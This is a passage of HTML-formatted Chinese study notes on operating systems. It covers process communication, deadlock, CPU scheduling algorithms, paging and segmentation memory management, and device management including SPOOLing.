class="headerlink" title="进程通信"></a>进程通信</h2><ul><li>进程通信方式<ul><li>低级通信原语<ul><li>交换信息量较少</li></ul></li><li>高级通信原语<ul><li>交换信息较多</li></ul></li></ul></li><li><code>linux</code>软中断通信机制<ul><li><code>kill(pid,sig)</code>：传递软中断信号</li><li><code>signal(sig,func)</code>：注册软中断信号</li><li><code>wait()</code>：用于父子进程间的同步</li><li><code>sleep()</code>：使当前进程睡眠</li></ul></li><li>管道通信<ul><li>父进程创建管道<code>fd[0]</code>读句柄、<code>fd[1]</code>写句柄</li><li>父进程<code>fork</code>、<code>createprocess</code>创建子进程</li><li>单向通信（双向通信创建两个管道）</li><li>特点<ul><li>只允许有血缘关系的进程间通信</li><li>面向字节流</li><li>跟随进程</li></ul></li></ul></li></ul><h1 id="第五章-资源分配与调度"><a href="#第五章-资源分配与调度" class="headerlink" title="第五章 资源分配与调度"></a>第五章 资源分配与调度</h1><h2 id="死锁的概念"><a href="#死锁的概念" class="headerlink" title="死锁的概念"></a>死锁的概念</h2><ul><li>死锁的定义<ul><li>两个或多个进程无限期地等待永远不会发生的条件的一种系统状态</li></ul></li></ul><h2 id="产生死锁的原因和必要条件"><a href="#产生死锁的原因和必要条件" class="headerlink" title="产生死锁的原因和必要条件"></a>产生死锁的原因和必要条件</h2><ul><li>死锁的原因<ul><li>系统资源有限<ul><li>资源数目不足以满足所有进程的需要，引起进程对资源的竞争而产生死锁</li></ul></li><li>并发进程的推进顺序不当<ul><li>进程在运行过程中，请求和释放资源的顺序不当，导致进程产生死锁</li></ul></li></ul></li><li>关于死锁的一些结论<ul><li>陷入死锁的进程至少是2个</li><li>参与死锁的进程至少有两个已经占用资源</li><li>参与死锁的所有进程都在等待资源</li><li>参与死锁的进程是当前系统中所有进程的子集</li><li>死锁会浪费大量的系统资源，甚至导致系统崩溃</li></ul></li><li>死锁的必要条件<ul><li>互斥条件<ul><li>资源具有独占性，进程互斥的使用资源</li></ul></li><li>不剥夺条件<ul><li>进程在释放资源前不能被其他程序剥夺</li></ul></li><li>部分分配条件<ul><li>进程所需要的资源逐步分配，需要时申请和分配</li></ul></li><li>环路条件<ul><li>多个进程构成环路：环中每个进程已经占用的资源被前一进程申请，而自己所需要的新资源又被环中后一进程所占用</li></ul></li></ul></li></ul><h2 id="解决死锁问题的策略"><a href="#解决死锁问题的策略" class="headerlink" title="解决死锁问题的策略"></a>解决死锁问题的策略</h2><ul><li>预防死锁<ul><li>通过设置某些限制条件，破坏死锁四个必要条件中的一个或多个，来防止死锁<ul><li>破坏互斥条件——难</li><li>破坏不剥夺条件——代价大</li><li>破坏部分分配条件——预先静态分配</li><li>破坏环路条件——有序资源分配</li></ul></li><li>由于限制太严格，导致资源利用率和吞吐率降低</li></ul></li><li>避免死锁——银行家算法</li><li>检测和恢复死锁<ul><li>允许死锁发生，但可通过检测机制及时检测出死锁状态，并精确确定与死锁有关的进程和资源，然后采取适当措施，将系统从已发生的死锁中清除，将程序从死锁状态解脱出来</li></ul></li></ul><h1 id="第六章-处理机调度（进程调度）"><a href="#第六章-处理机调度（进程调度）" class="headerlink" title="第六章 处理机调度（进程调度）"></a>第六章 处理机调度（进程调度）</h1><h2 id="进程调度概念"><a href="#进程调度概念" class="headerlink" title="进程调度概念"></a>进程调度概念</h2><ul><li>调度定义<ul><li>在一个队列中，按某种策略选择一个最合适的个体</li></ul></li><li>调度分类<ul><li>长程调度/宏观调度/作业调度</li><li>中程调度/交换调度</li><li>短程调度/进程调度</li><li><code>IO</code>调度/设备调度</li><li><img src="/2022/03/09/osNote/image-20220101213941318.png" alt="image-20220101213941318"></li></ul></li><li>进程调度的目标<ul><li>响应速度尽可能快</li><li>进程处理时间尽可能短</li><li>系统吞吐量尽可能大</li><li>资源利用率尽可能高</li><li>对所有进程要公平</li><li>避免饥饿</li><li>避免死锁</li></ul></li><li>进程调度的量化指标<ul><li>周转时间/平均周转时间</li><li>带权周转时间/平均带权周转时间</li></ul></li><li>周转时间<ul><li>进程提交给计算机到完成所花费的时间<code>t = tc - ts</code><ul><li><code>ts</code>——进程的提交时间</li><li><code>tc</code>——进程的完成时间</li></ul></li><li>意义：说明进程在系统中停留的时间长短</li></ul></li><li>平均周转时间<ul><li><code>t = (t1 + t2 + ...... +tn)/n</code></li><li>平均周转时间越短，意味着这些进程在系统中停留的时间越短，因而系统吞吐量也越大，资源利用率越高</li></ul></li><li>带权周转时间<ul><li><code>w = t/tr</code><ul><li><code>t</code>——进程的周转时间</li><li><code>tr</code>——进程的运行时间</li></ul></li><li>意义：进程在系统中的相对停留时间</li></ul></li><li>平均带权周转时间<ul><li><code>w = (w1 + w2 + ...... +wn)/n</code></li></ul></li></ul><h2 id="进程调度算法"><a href="#进程调度算法" class="headerlink" title="进程调度算法"></a>进程调度算法</h2><ul><li>先来先服务调度<ul><li>晚来但是很短的作业可能需要等待很长时间，不利于短作业</li></ul></li><li>短作业优先调度<ul><li>忽视了等待时间，一个早来但是很长的作业将会得不到调度</li></ul></li><li>响应比高者优先调度<ul><li>响应比 = 加权周转时间</li></ul></li><li>优先数调度<ul><li>优先数 = 静态优先数 + 动态优先数</li><li>静态优先数：在进程创建时确定，在整个进程运行期间不再改变</li><li>动态优先数：动态优先数在进程期间可以改变</li></ul></li><li>循环轮转调度<ul><li>把所有就绪进程按先进先出的原则排成队列，进程以时间片为单位轮流使用<code>CPU</code><ul><li>时间片太大则会退化成先来先服务算法</li><li>时间片太小则会引起进程切换频繁，系统开销增大</li></ul></li></ul></li><li>可变时间片轮转调度</li><li>多重时间片循环调度</li><li>调度方式<ul><li>定义<ul><li>当一进程正在<code>CPU</code>上运行时，若有更高优先级的进程需要运行，系统如何分配<code>CPU</code></li></ul></li><li>非剥夺方式<ul><li>让正在运行的进程继续执行，直到该进程完成或发生某事件而进入完成或阻塞的状态，才把<code>CPU</code>分配给新来的更高优先级的进程</li></ul></li><li>剥夺方式<ul><li>当更高优先级的进程来到时，便暂停正在运行的进程，立即把<code>CPU</code>分配给新来的优先级更高的进程</li></ul></li></ul></li></ul><h2 id="Linux进程调度"><a href="#Linux进程调度" class="headerlink" title="Linux进程调度"></a>Linux进程调度</h2><ul><li>基本特点<ul><li>基于优先级调度</li><li>支持普通进程，也支持实时进程</li><li>实时进程优先于普通进程</li><li>普通进程公平使用<code>CPU</code>时间</li></ul></li></ul><h1 id="第七章-主存管理"><a href="#第七章-主存管理" class="headerlink" title="第七章 主存管理"></a>第七章 主存管理</h1><h2 id="内存管理的功能"><a href="#内存管理的功能" class="headerlink" title="内存管理的功能"></a>内存管理的功能</h2><ul><li>实际存储体系<ul><li>三级存储体系</li><li><code>Cache</code>+内存+辅存</li><li>基本原理<ul><li>当内存太小不够时，用辅存来支援内存</li><li>暂时不运行的模块换出到辅存上，必要时再换入内存</li></ul></li></ul></li><li>存储管理的功能<ol><li>地址映射</li><li>虚拟存储（存储扩充）</li><li>内存分配</li><li>存储保护</li></ol></li><li>地址映射<ul><li>定义<ul><li>把程序中的地址（虚拟地址/虚地址/逻辑地址）变换为真实的内存地址（实地址/物理地址）的过程</li></ul></li><li>方式<ul><li>固定地址映射</li><li>静态地址映射</li><li>动态地址映射</li></ul></li><li>固态地址映射<ul><li>定义：编程或编译时确定逻辑地址和物理地址间的映射关系</li><li>特点<ul><li>程序加载时必须放到指定的内存区域</li><li>容易产生地址冲突，运行失败</li><li>不能适应多道环境</li></ul></li></ul></li><li>静态地址映射<ul><li>定义：程序装入时由操作系统完成逻辑地址到物理地址的映射<ul><li>保证在运行之前将所有地址都绑定到主存</li></ul></li><li><code>MA = BA + VA</code><ul><li><code>MA</code>——物理地址</li><li><code>BA</code>——装入基址，基址寄存器</li><li><code>VA</code>——逻辑地址</li></ul></li><li>特点<ul><li>程序运行之前确定映射关系</li><li>程序装入后不能移动</li><li>程序占用连续的内存空间</li></ul></li></ul></li><li>动态地址映射<ul><li>定义：在程序执行过程中把逻辑地址转换为物理地址<ul><li>例如：<code>MOV AX, [500]</code>，访问500单元时执行地址转换</li></ul></li><li><code>MA = BA + VA</code><ul><li><code>MA</code>——物理地址</li><li><code>BA</code>——装入基址，基址寄存器</li><li><code>VA</code>——逻辑地址</li></ul></li><li>特点<ul><li>程序占用的内存空间可动态变化<ul><li>若程序移动及时更新基址<code>BA</code></li></ul></li><li>程序不要求占用连续的内存空间<ul><li>需要记录每段放置的基址<code>BA</code></li></ul></li><li>便于多个进程共享代码<ul><li>共享代码作为独立的一段存放</li></ul></li></ul></li></ul></li></ul></li><li>虚拟存储（存储扩充）<ul><li>解决的问题<ul><li>程序过大或过多时，内存不够，不能运行</li><li>多个程序并发时地址冲突，不能运行</li></ul></li><li>虚拟存储的基本原理<ul><li>借助辅存在逻辑上扩充主存，解决内存不足</li><li>过程<ul><li>迁入：将要运行的部分装入内存，把辅存存放的部分临时按需调入内存</li><li>迁出：把当前不运行的部分暂时存放在辅存，尽量腾出足够的内存供进程正常运行</li></ul></li><li>前提：短时间内进程不运行的部分往往占大部分</li><li>用户体验了足够大的线性内存——虚拟内存</li></ul></li><li>程序局部性原理<ul><li>时间局部性<ul><li>一条指令或数据，会在较短的时间内被重复访问</li><li>例如：循环语句</li></ul></li><li>空间局部性<ul><li>任一内存单元及其临近单元会在短时间内被集中访问</li><li>短时间内，<code>CPU</code>对内存的访问往往会集中在一个较小区域内</li><li>例如：表，数组的操作</li></ul></li><li>结论<ul><li>程序在一个有限的时间段内访问的代码和数据往往集中在有限的地址范围内，因此，一般情况下，把程序的一部分装入内存在较大概率上也足够让其运行一段时间</li></ul></li></ul></li><li>实现虚拟存储的前提<ul><li>足够的辅存</li><li>适量容量的内存</li><li>地址变换结构</li></ul></li><li>虚拟存储的应用<ul><li>页式虚拟存储</li><li>段式虚拟存储</li></ul></li></ul></li><li>内存分配<ul><li>为程序运行分配足够的内存空间</li><li>需要解决的问题<ul><li>放置策略<ul><li>程序调入内存时将其放在哪个位置</li><li>全部分配或部分分配</li></ul></li><li>调入策略<ul><li>何时把要运行的代码或访问的数据调入内存</li></ul></li><li>淘汰策略<ul><li>迁出哪些代码和数据以腾出内存空间</li></ul></li></ul></li></ul></li><li>存储保护<ul><li>保证内存中的多道程序只能在给定的存储区域活动并互不干扰</li><li>保护方法<ul><li>界址寄存器<ul><li>在<code>CPU</code>中设置一对下限寄存器和上限寄存器，存放程序在内存中的下限地址和上限地址</li><li>基址寄存器和限长寄存器</li><li>适用于连续物理分区中的情形</li></ul></li><li>存储键保护<ul><li>适用于不连续物理分块的情形，也可用于共享中的权限</li></ul></li></ul></li></ul></li></ul><h2 id="物理内存管理"><a href="#物理内存管理" class="headerlink" title="物理内存管理"></a>物理内存管理</h2><ul><li>物理内存管理方法<ul><li>单一区存储管理（不分区存储管理）</li><li>分区存储管理</li><li>内存覆盖技术</li><li>内存交换技术</li></ul></li><li>单一区存储管理<ul><li>内存的用户区不分区，完全被一个程序所占用</li></ul></li></ul><h3 id="分区存储管理"><a href="#分区存储管理" class="headerlink" title="分区存储管理"></a>分区存储管理</h3><ul><li><p>定义：把用户区内存划分成若干大小不等的分区，供不同程序使用</p></li><li><p>分类</p><ul><li>固定分区</li><li>动态分区</li></ul></li><li><p>固定分区</p><ul><li>把内存固定的划分为若干个大小不等的分区供各个程序使用，每个分区的大小和位置都固定，系统运行期间不再重新划分</li><li>分区表：记录分区的位置、大小和使用标志</li><li>例子：<img src="/2022/03/09/osNote/image-20220102091501217.png" alt="image-20220102091501217"></li><li>使用特点<ul><li>在程序装入之前，内存已被分区，不再改变</li><li>每个分区大小不同，适应于不同大小的程序</li><li>系统需要维护分区表</li></ul></li><li>固定分区缺点<ul><li>浪费内存：程序比所在分区小</li><li>大的程序可能无法运行：程序比最大分区大，无法装入</li></ul></li><li>应用建议<ul><li>程序大小、个数、装入顺序都是固定的情形</li><li>根据分区表安排程序装入顺序</li></ul></li></ul></li><li><p>动态分区</p><ul><li><p>在程序装入时创建分区，使分区的大小刚好与程序的大小相等</p></li><li><p>例子：<img src="/2022/03/09/osNote/image-20220102091843105.png" alt="image-20220102091843105"></p><p><img src="/2022/03/09/osNote/image-20220102091931479.png" alt="image-20220102091931479"></p></li><li><p>特点</p><ul><li>分区动态建立</li><li>分区的个数和大小均可变</li><li>存在内存碎片</li></ul></li><li><p>动态分区需要解决的问题</p><ul><li>分区的选择</li><li>分区的分配</li><li>分区的回收</li><li>解决内存的碎片问题</li></ul></li><li><p>分区的选择（放置策略）</p><ul><li><p>程序装入空闲区时，尽量往高地址靠拢</p></li><li><p>空闲区表：描述内存空闲区的位置和大小的数据结构</p></li><li><p>分区选择：</p><ul><li>从空闲区表中选择一个空闲区给用户使用</li><li>选择策略/放置策略</li></ul></li><li><p>放置策略</p><ul><li>从排序好的空闲区表中选择第一个大小够大的分区</li><li>选择分区与空闲区表排序方式有关</li></ul></li><li><p>空闲区表的排序原则</p><ul><li>首次适应算法：按空闲区位置递增排序<ul><li>尽可能先利用低地址空间</li></ul></li><li>最佳适应法：按空闲区大小递增排序<ul><li>尽量选择满足要求的最小空闲区</li></ul></li><li>最坏适应法：按空闲区大小递减排序<ul><li>尽量使用最大的空闲区</li><li>仅作一次查找就可以找到所要分区</li></ul></li></ul></li></ul></li><li><p>分区的分配</p><ul><li>从用户选中的分区中分配/分割所需大小给用户</li><li>剩余部分依然作为空闲区登记在空闲区表中</li><li>注意：分割空闲区时，一般把底部分割给用户（因此，空闲区表只需修改大小即可）</li></ul></li><li><p>分区的回收</p><ul><li>回收程序占用的分区（释放区），将其适当处理后登记到空闲区表中，以便再分配</li><li>若释放区与现有空闲区相邻则合并</li></ul></li><li><p>碎片问题</p><ul><li>动态分区的缺点<ul><li>容易产生内存碎片：内存反复分配和分割</li><li>首次适应法，最佳适应法，最坏适应法</li></ul></li><li>解决碎片的方法<ul><li>规定门限值：分割空闲区时，若剩余部分小于门限值，则此空闲区不进行分割，而是全部分配给用户</li><li>内存拼接技术：将所有空闲区集中一起构成一个大的空闲区</li><li>把程序分拆成几个部分装入不同分区，充分利用碎片</li></ul></li></ul></li></ul></li></ul><h3 id="覆盖技术"><a href="#覆盖技术" class="headerlink" title="覆盖技术"></a>覆盖技术</h3><ul><li>目的：在较小的内存空间中运行较大的程序</li><li>内存分区<ul><li>常驻区：被某段单独使用且固定的占用的分区，可划分多个</li><li>覆盖区：能被多段共用（覆盖）的区域，可划分多个</li></ul></li><li>工作原理<ul><li>程序划分成若干代码段或数据段</li><li>将程序常用的段装入常驻区</li><li>将程序不常用的段装入覆盖区<ul><li>正在运行的段处于覆盖区</li><li>暂时不运行的段放在硬盘中（覆盖文件）</li><li>即将运行的段装入覆盖区（覆盖旧内容）</li></ul></li><li>意义：减少程序对内存的需求</li><li>例子：<img src="/2022/03/09/osNote/image-20220102094233950.png" alt="image-20220102094233950"></li></ul></li></ul><h3 id="对换技术"><a href="#对换技术" class="headerlink" title="对换技术"></a>对换技术</h3><ul><li>原理<ul><li>当内存不够时把进程写到磁盘，当进程要运行时重新写回内存</li></ul></li><li>优点<ul><li>增加进程并发数</li><li>不考虑程序结构</li></ul></li><li>缺点<ul><li>换入和换出增加<code>CPU</code>开销</li><li>对换单位太大</li></ul></li></ul><h2 id="虚拟内存管理"><a href="#虚拟内存管理" class="headerlink" title="虚拟内存管理"></a>虚拟内存管理</h2><ul><li>物理内存（即实内存）管理<ul><li><img src="/2022/03/09/osNote/image-20220102094616055.png" alt="image-20220102094616055"></li></ul></li><li>改善物理内存管理的相关技术<ul><li>内存拼接</li><li>对换技术</li><li>覆盖技术</li></ul></li><li>虚拟内存的概念<ul><li>虚拟内存是面向用户的虚拟封闭存储空间</li><li>线性地址空间</li><li>容量<code>4G</code></li><li>封闭空间（进程空间）</li><li>和物理地址分离（地址无冲突）</li><li>程序员编程时使用线性虚拟地址</li></ul></li><li>虚拟内存管理<ul><li>目标<ul><li>使得大的程序能在较小的内存中运行</li><li>使得多个程序能在较小的内存中运行</li><li>使得多个程序并发运行时地址不冲突</li><li>使得内存利用效率高</li></ul></li><li>虚拟内存管理的实现思路<ul><li>把程序一小部分装入内存在较大概率上也足够让其运行一小段时间</li><li>程序的局部性<ul><li>程序在一个有限的时间段内访问的代码和数据往往集中在有限的地址范围内</li></ul></li></ul></li><li>典型虚拟内存管理方式<ul><li>页式虚拟内存管理</li><li>段式虚拟内存管理</li><li>段页式虚拟内存管理</li></ul></li></ul></li></ul><h3 id="页式存储管理"><a href="#页式存储管理" class="headerlink" title="页式存储管理"></a>页式存储管理</h3><ul><li>页式虚拟内存管理<ul><li>概念<ul><li>把进程空间（虚拟）和内存空间都划分成等大小的小片<ul><li>进程的小片——页</li><li>内存的小片——页框</li><li>小片的典型大小：<code>1K、2K、4K</code></li></ul></li></ul></li><li>程序装入和使用内存的原则<ul><li>内存以页框为单位分配使用</li><li>进程以页为单位装入内存<ul><li>只把程序部分页装入内存便可运行</li><li>页在内存中占用的页框不必相邻</li><li>需要新页时，按需从硬盘调入内存</li><li>不在运行的页及时删除，腾出空间</li></ul></li></ul></li><li>页式系统中的地址<ul><li>虚拟地址<code>VA</code>是线性的，从0开始</li><li><code>VA</code>分成页号<code>P</code>和页内偏移<code>W</code><ul><li>所处页编号<code>P = VA/页大小</code></li><li>所处页偏移<code>W = VA%页大小</code></li></ul></li></ul></li><li>地址映射过程<ul><li>页面映射表：记录页与页框之间的对应关系，也叫页表</li><li>例子：<img src="/2022/03/09/osNote/image-20220102100141218.png" alt="image-20220102100141218"></li><li>过程：<ol><li>从<code>VA</code>中分离页号<code>P</code>和页内偏移<code>W</code></li><li>查找页表，以<code>P</code>为索引查找页框号<code>P'</code></li><li>计算物理地址<code>MA = P' * 页大小 + W</code></li></ol></li><li>快表：页表部分存放在<code>Cache</code>中称为快表<ul><li>地址映射时优先访问快表</li><li>合理的页面调度策略能使快表具有较高的命中率</li></ul></li><li>页面的共享<ul><li>在页表中填上共享的页框号，从而实现页面共享</li><li>共享页面在内存中只有一份真实存储，节省内存</li></ul></li></ul></li><li>页表的建立<ul><li>操作系统为每个进程创建一个页表<ul><li>页表长度和首地址存放在进程控制块中</li></ul></li><li>当前运行进程的页表驻留在内存<ul><li>页表长度和首地址由页表长度寄存器和页表首址寄存器指示</li></ul></li></ul></li><li>页表扩充<ul><li>扩充有中断位<code>I</code>和辅存地址的页表</li><li>中断位<code>I</code>——标识该页是否在内存中，为<code>1</code>标识不在内存，为<code>0</code>标识在内存</li><li>辅存地址——该页在辅存上的位置</li><li>扩充有访问位（引用位）和修改位的页表</li><li>访问位——标识该页是否最近被访问</li><li>修改位——标识该页的数据是否已被修改</li></ul></li><li>缺页中断<ul><li>在地址映射的过程中，当要访问的目的页不在内存时，则系统产生异常中断——缺页中断</li><li>缺页中断处理程序<ul><li>中断处理程序把所缺的页从页表指出的辅存地址调入内存的某个页框中，并更新页表中该页对应的页框号以及修改中断位<code>I</code>为0</li><li><img src="/2022/03/09/osNote/image-20220102102025891.png" alt="image-20220102102025891"></li></ul></li><li>缺页率：<code>f = 缺页次数/访问页面总次数</code></li><li>缺页中断和普通中断<ul><li>相同点：保护现场、中断处理、恢复现场</li><li>不同点：响应时机：普通中断在指令完成后响应，缺页中断在指令执行时响应</li></ul></li></ul></li><li>二级页表<ul><li>页表实现时的问题<ul><li>页表全部装入过度消耗内存（<code>4M</code>）</li><li>难以找到连续的<code>1k</code>个页框存放页表</li></ul></li><li>解决办法<ul><li>仅将页表的部分内容调入内存</li><li>将<code>4M</code>的超大页表分拆存储到离散的<code>1k</code>个页框中</li></ul></li><li><img src="/2022/03/09/osNote/image-20220102102800509.png" alt="image-20220102102800509"></li><li><img src="/2022/03/09/osNote/image-20220102102814871.png" alt="image-20220102102814871"></li><li><img src="/2022/03/09/osNote/image-20220102102824123.png" alt="image-20220102102824123"></li></ul></li><li>淘汰策略<ul><li>选择淘汰哪一页的规则称为淘汰策略</li><li>页面抖动：页面在内存和辅存之间频繁交换的现象</li><li>好的淘汰策略<ul><li>较低的缺页率</li><li>页面抖动较少</li></ul></li><li>常用的淘汰算法<ul><li>最佳算法</li><li>先进先出算法</li><li>最久未使用算法</li><li>最不经常使用算法</li></ul></li></ul></li><li>最佳算法<ul><li>淘汰不再需要或最远的将来才会使用的页面</li></ul></li><li>先进先出淘汰算法<ul><li>淘汰在内存中停留时间最长的页面</li></ul></li><li>最久未使用淘汰算法<ul><li>淘汰最长时间未使用的页面</li></ul></li><li>最不经常使用淘汰算法<ul><li>选择到当前时间为止被访问次数最少的页面</li><li>每页设置访问计数器，每当页面被访问时，该页面的访问计数器加一</li><li>发生缺页中断时，淘汰计数值最小的页面，并将<strong>所有计数</strong>清零</li></ul></li><li>页面大小选择<ul><li>页面过大：浪费内存，极限是分区存储</li><li>页面过小：页面增多，页表长度增加，浪费内存，换页频繁，系统效率低</li></ul></li><li>影响缺页次数的因素<ul><li>淘汰算法</li><li>分配给进程的页框数</li><li>页本身的大小：页面越小越容易缺页</li><li>程序的编制方法<ul><li>局部性越好，越不容易缺页</li><li>跳转或分支越多越容易缺页</li></ul></li></ul></li><li>页式系统的不足<ul><li>页面划分无逻辑含义</li><li>页的共享不灵活</li><li>页内碎片</li></ul></li></ul></li></ul><h3 id="段式存储管理"><a href="#段式存储管理" class="headerlink" title="段式存储管理"></a>段式存储管理</h3><ul><li>进程分段<ul><li>把进程按逻辑意义划分成多个段，每段有段名，长度不定，进程由多段组成</li><li>例如：一个具有代码段、数据段、堆栈段的进程</li></ul></li><li>段式内存管理系统的内存分配<ul><li>以段为单位装入，每段分配相邻的内存</li><li>但是段与段之间不要求相邻</li></ul></li><li>段式系统的虚拟地址<ul><li>段式虚拟地址<code>VA</code>包含段号<code>S</code>和段内偏移<code>W</code></li></ul></li><li>段表<ul><li>记录每段在内存中映射的位置</li><li>段号|段长|基地址</li><li>段表的字段<ul><li>段号<code>S</code>——段的唯一编号</li><li>段长<code>L</code>——该段的长度</li><li>基地址<code>B</code>——该段在内存中的首地址</li></ul></li></ul></li><li>段式地址的映射机制<ul><li>过程<ol><li>由逻辑地址<code>VA</code>分离出(<code>S</code>,<code>W</code>)</li><li>查询段表：检索段号<code>S</code>，查询该段基地址<code>B</code>和长度<code>L</code></li><li>物理地址<code>MA = B + W</code></li></ol></li></ul></li><li>段表的扩充<ul><li>基本字段：段号，长度，基址</li><li>扩展字段：中断位，访问位，修改位，<code>R/W/X</code></li></ul></li><li>段的共享<ul><li>共享段在内存中只有一份存储</li><li>共享段被进程映射到自己的空间（写入段表）</li><li>所有共享的模块都可以设置为单独的段</li></ul></li><li>段式系统的缺点<ul><li>段需要连续的存储空间</li><li>段的最大尺寸收到内存大小的限制</li><li>在辅存中管理可变尺寸的段比较困难</li></ul></li><li>段式系统与页式系统<ul><li>地址空间的区别<ul><li>页式系统：一位地址空间</li><li>段式系统：二维地址空间</li></ul></li><li>段与页的区别<ul><li>段长可变——页面固定大小</li><li>段的划分有意义——页面划分无意义</li><li>段方便共享——页面不方便共享</li><li>段用户可见——页面用户不可见</li><li>段偏移有溢出——页偏移无溢出</li><li>段式系统不会产生碎片问题——页式系统会产生碎片</li></ul></li></ul></li></ul><h3 id="段页式存储管理"><a href="#段页式存储管理" class="headerlink" title="段页式存储管理"></a>段页式存储管理</h3><ul><li>在段式存储管理中结合页式存储管理技术</li><li>在段中划分页面</li><li>段页式系统的地址构成：段号|页号|页内偏移<ul><li>逻辑地址：段号<code>S</code>，页号<code>P</code>，页内偏移<code>W</code></li><li>内存按页划分，按页装入</li></ul></li><li>段页式地址的映射结构<ul><li>同时采用段表和页表实现地址映射<ul><li>系统为每个进程建立一个段表</li><li>系统为每个段建立一个页表</li><li>段表给出每段的页表基地址和页表长度（段长）</li><li>页表给出每页对应的框</li></ul></li><li><img src="/2022/03/09/osNote/image-20220102110251274.png" alt="image-20220102110251274"></li></ul></li></ul><h2 id="Linux存储管理"><a href="#Linux存储管理" class="headerlink" title="Linux存储管理"></a>Linux存储管理</h2><ul><li><code>/proc</code>文件系统<ul><li>特点<ul><li>内存文件系统</li><li>为用户访问内核信息提供接口<ul><li>例：<code>CPU</code>信息</li><li>例：内核信息（进程信息）</li></ul></li></ul></li></ul></li></ul><h1 id="第八章-设备管理（输入-x2F-输出管理）"><a href="#第八章-设备管理（输入-x2F-输出管理）" class="headerlink" title="第八章 设备管理（输入/输出管理）"></a>第八章 设备管理（输入/输出管理）</h1><h2 id="设备管理概述"><a href="#设备管理概述" class="headerlink" title="设备管理概述"></a>设备管理概述</h2><ul><li>设备管理功能<ul><li>状态跟踪<ul><li>生成设备管理器的数据结构，动态的记录各种设备的状态</li></ul></li><li>设备分配<ul><li>设备分配功能是设备管理的基本任务</li></ul></li><li>设备映射<ul><li>设备的两种名字：设备逻辑名、设备物理名</li><li>从应用软件的角度看，逻辑设备是一类物理设备的抽象</li><li>从设备管理程序的角度看，物理设备是逻辑设备的实例</li><li>设备独立性<ul><li>逻辑设备对用户透明</li><li>用户使用统一规范的方式使用设备</li></ul></li></ul></li><li>设备控制和设备驱动<ul><li>对物理设备进行控制，实现<code>IO</code>操作</li><li>把来自应用的服务请求（例如：读写命令）转换为一系列<code>IO</code>指令，控制设备完成相关操作</li><li>向用户提供统一的设备使用接口：<code>read、write</code></li><li>设备驱动程序的特点<ul><li>设备驱动程序与硬件密切相关</li><li>每类设备都要配置特定的驱动程序</li></ul></li></ul></li><li>缓冲区管理<ul><li>组织<code>IO</code>缓冲区</li></ul></li></ul></li></ul><h2 id="缓存技术"><a href="#缓存技术" class="headerlink" title="缓存技术"></a>缓存技术</h2><ul><li>缓冲作用<ol><li>连接有着不同数据传输速度的设备</li><li>协调数据记录大小的不一致</li><li>正确执行应用程序的语义拷贝<ul><li><code>write(Data,Len)</code>向磁盘写入<code>Data</code></li><li>方法：<ul><li>内核写完再返回（实时性差）</li><li>内核设置缓冲区，完成内核复制即返回，之后由内核把缓冲区写到磁盘（实时性好）</li></ul></li></ul></li></ol></li><li>提前读和延后写<ul><li>存储设备</li><li>提高数据传输效率</li><li>减少进程访问目标设备的次数</li></ul></li><li>提前读<ul><li>进程处理一个输入数据时，直接从<code>IO</code>缓冲区读入，正确的数据已被提前读入到<code>IO</code>缓冲区中<ul><li>结论：内核提前从输入设备把数据读到<code>IO</code>缓冲区中</li><li>但不一定是正确数据</li><li>注意同步问题</li></ul></li></ul></li><li>延后写<ul><li>进程输出数据时，仅把数据写入<code>IO</code>缓冲区，此后，待输出设备空闲时，内核把<code>IO</code>缓冲区的数据写入输出设备<ul><li>结论：用户处理数据的同时内核输出（有延后）前一数据</li></ul></li></ul></li><li>常用的缓冲技术——环形缓冲<ul><li>若干缓冲单元首尾链接成一个环：环形缓存区</li><li><img src="/2022/03/09/osNote/image-20220102134336158.png" alt="image-20220102134336158"></li><li><img src="/2022/03/09/osNote/image-20220102134419834.png" alt="image-20220102134419834"></li></ul></li></ul><h2 id="设备分配"><a href="#设备分配" class="headerlink" title="设备分配"></a>设备分配</h2><ul><li>设备分配方法<ul><li>独享分配</li><li>共享分配</li><li>虚拟分配</li></ul></li><li>独占设备<ul><li>每次只能供一个进程单独使用的设备<ul><li>打印机、键盘、鼠标等</li></ul></li></ul></li><li>共享设备<ul><li>允许多个进程同时使用的设备<ul><li>块设备、硬盘等</li></ul></li></ul></li><li>虚拟设备<ul><li>借助虚拟技术，在共享设备上模逆独占型设备<ul><li>一般是辅存上模逆独占型设备</li></ul></li></ul></li><li>设备分配<ul><li>独享分配<ul><li>申请成功——开始使用——用完释放</li></ul></li><li>共享分配<ul><li>即时申请即时分配，不阻塞</li></ul></li><li>虚拟分配<ul><li>申请独占设备，实际分配虚拟设备</li></ul></li></ul></li><li>虚拟技术<ul><li>在一类物理设备上模逆另一类物理设备的技术<ul><li>通常借助辅存的一部分区域模拟独占设备，将独占设备转为共享设备</li></ul></li><li>虚拟设备<ul><li>用来模拟独占设备的部分辅存称为虚拟设备，虚拟独占设备</li><li>输入井：模拟输入设备的辅存区域</li><li>输出井：模逆输出设备的辅存区域</li></ul></li></ul></li><li>虚拟分配<ul><li>申请独占设备，实际分配虚拟设备</li><li><code>SPOOLING</code>系统是虚拟技术和虚拟分配的实现<ul><li><img src="/2022/03/09/osNote/image-20220102131915385.png" alt="image-20220102131915385"></li></ul></li></ul></li><li><code>SPOOLing</code>系统构成<ul><li>输入井和输出井<ul><li>磁盘上开辟的两个存储区域</li></ul></li><li>输入缓冲区和输出缓冲区<ul><li>内存中开辟的存储区域，暂存输入输出数据，以后在传送到输入井和输出井</li></ul></li><li>预输入程序：控制信息从独占设备输入到缓存</li><li>预输入表：从哪台设备输入，存放在输入井的位置</li><li>缓输出程序：控制信息从缓存输出到独占设备</li><li>缓输出表：输出信息在输出井的位置，从那台设备输出</li><li>井管理程序：控制用户程序与辅存之间的信息交换</li></ul></li><li><code>SPOOLing</code>系统原理小结<ul><li>任务执行前：预先将程序和数据输入到输入井中</li><li>任务运行时：使用数据时，从输入井中取出</li><li>任务运行时：输出数据时，把数据写入输出井</li><li>任务运行完：外设空闲时输出全部数据和信息</li></ul></li><li><code>SPOOLing</code>优点<ul><li>提高了<code>IO</code>速度</li><li>将独占设备改造为“共享设备”<ul><li>实现了虚拟设备功能</li></ul></li></ul></li></ul><h2 id="设备驱动程序"><a href="#设备驱动程序" class="headerlink" title="设备驱动程序"></a>设备驱动程序</h2><ul><li><p><code>Linux</code>模块</p><ul><li><code>LKM</code></li><li>一种未经链接的可执行代码</li><li>可以动态的加载或卸载模块</li><li>经过连接称为内核的一部分</li></ul></li><li><p><code>Linux</code>设备驱动（<code>LDD</code>）</p><ul><li><img src="/2022/03/09/osNote/image-20220102134627709.png" 